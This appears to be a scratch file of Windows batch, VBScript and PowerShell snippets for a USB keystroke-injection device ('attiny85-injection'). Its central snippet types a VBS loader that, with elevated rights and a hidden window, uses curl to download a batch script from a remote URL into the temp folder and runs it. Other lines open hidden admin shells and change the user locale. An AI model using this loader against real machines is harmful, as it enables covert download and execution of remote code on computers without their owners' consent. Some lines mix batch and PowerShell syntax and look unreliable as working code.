@rem copy dash (ascii code: 45)
cmd /c exit 45
setx DASH %=exitcodeAscii%

@rem delete environment variable (PowerShell)
[Environment]::SetEnvironmentVariable('DASH', $null, 'User')

@rem set user locale (PowerShell)
PowerShell Set-WinUserLanguageList -LanguageList de-DE -force

@rem full_script.bat url: https://raw.githubusercontent.com/8AC2BC7E026226F2856A9DA8C4033927/attiny85-injection/main/injection/full_script.bat

@rem .vbs script to run bat script (0: invisible, 1: visible)
cmd /k cd %temp%&copy con loader.vbs
CreateObject("Shell.Application").ShellExecute "cmd","/k curl -m 10 --retry 20 -o %temp%\script.bat https://raw.githubusercontent.com/8AC2BC7E026226F2856A9DA8C4033927/attiny85-injection/main/injection/full_script.bat&%temp%\script.bat","","runas",0
Key: Enter
Key: Ctrl+C
loader.vbs
exit


@rem sample .bat script
@echo off&set /p DUMMY=Hit ENTER to continue...

@rem create invisible admin shell running fetching and running .bat script
cmd /k cd %temp%&echo|set /p="VBS_SCRIPT">script.vbs&script.vbs&exit

Powershell -Command cd %temp% | echo "this is a test" > test.txt
Powershell -Command Start-Process C:\Users\wanja\Documents\Arduino\cmd\test.bat -Verb RunAs
Powershell -Windowstyle Hidden -Command Start-Process wscript.exe -ArgumentList "C:\Users\wanja\Documents\Arduino\cmd\invisible.vbs C:\Users\wanja\Documents\Arduino\cmd\test.bat"

cmd /k cd %temp%&echo|set /p="CreateObject("Shell.Application").ShellExecute "script.bat",,"","runas",1">script.vbs&echo set /p DUMMY=Hit ENTER to continue...>script.bat&script.vbs&exit



Powershell (New-Object System.Media.SoundPlayer "$env:windir\Media\tada.wav").PlaySync()